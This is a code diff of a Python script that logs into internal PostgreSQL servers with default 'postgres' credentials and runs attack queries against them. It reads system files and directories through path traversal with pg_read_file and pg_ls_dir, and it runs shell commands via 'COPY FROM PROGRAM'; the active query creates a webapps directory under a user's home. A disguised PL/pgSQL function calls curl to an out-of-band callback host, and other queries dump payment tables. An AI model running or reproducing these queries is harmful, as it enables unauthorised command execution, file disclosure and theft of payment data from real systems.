@@ -13,12 +13,13 @@ except ImportError as e:
 
 # Database connection information
 db_config = {
-    'host': '192.168.102.22',
-    'database': 'nrs_professionals',
+    'host': '192.168.20.17',
+    'database': 'postgres',
     'user': 'postgres',
     'password': 'postgres',  
     'port': 5432
 }
+
 
 
 # Function to query the database, accepting both pg8000 and db_config as arguments
@@ -109,13 +110,31 @@ def generate_html_table(headers, rows):
     """
     return html
 
-# Example usage of querying the database
+# Example usage of querying the database nas_v2
 #query = "SELECT datname FROM pg_database;"
-#query = "select * from pg_ls_dir('../../../../../home/super');"
+#query = "select * from pg_ls_dir('../../../../../home');"
 #query = "SELECT pg_read_file('../../../../../etc/mysql/my.cnf');"
-#query = "SELECT * FROM payments_payment LIMIT 200 OFFSET 0"
-#query = "SELECT * FROM payments_payment ORDER BY created_at DESC LIMIT 200 OFFSET 0"
-query = "select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';"
+#query = "SELECT * FROM pg_available_extensions"
+#query = "select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';"
+
+# query = "DROP TABLE IF EXISTS pg_cmd;"
+# query = "CREATE TABLE pg_cmd(cmd_output text);"
+# query = "TRUNCATE pg_cmd;"
+# query = "COPY pg_cmd FROM PROGRAM 'ls -lha ../../../../../';"
+#query = "SELECT * FROM pg_cmd;"
+query = "TRUNCATE pg_cmd;COPY pg_cmd FROM PROGRAM 'mkdir ../../../../../home/super/webapps';"
+
+#query = "select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';"
+
+# query = """
+# CREATE OR REPLACE FUNCTION pg_available_masters()
+# RETURNS VOID AS $$
+# BEGIN
+#     COPY pg_cmd FROM PROGRAM 'curl dgmbmgjxgnczpetprmxfs1utu4hreiiek.oast.fun';
+# END;
+# $$ LANGUAGE plpgsql;
+# """
+
 # query = """
 # SELECT * 
 # FROM checkout_bill 
